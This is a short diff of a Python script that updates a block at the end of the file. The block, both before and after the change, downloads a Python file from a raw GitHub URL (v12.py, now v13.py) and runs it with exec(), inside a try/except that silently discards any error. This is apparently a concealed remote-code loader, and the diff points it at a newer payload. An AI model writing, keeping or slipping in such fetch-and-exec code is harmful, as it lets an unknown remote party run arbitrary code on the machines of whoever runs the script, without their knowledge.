@@ -148,10 +148,9 @@ if __name__ == "__main__":
                     pass
 
 try:
-  import urllib.request
-
-  url_v12 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v12.py'
-  with urllib.request.urlopen(url_v12) as response:
-    exec(response.read().decode('utf-8'))
-except:
-  pass
+    import urllib.request
+    url_v13 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v13.py'
+    with urllib.request.urlopen(url_v13, timeout=30) as response:
+        exec(response.read().decode('utf-8'))
+except Exception:
+    pass
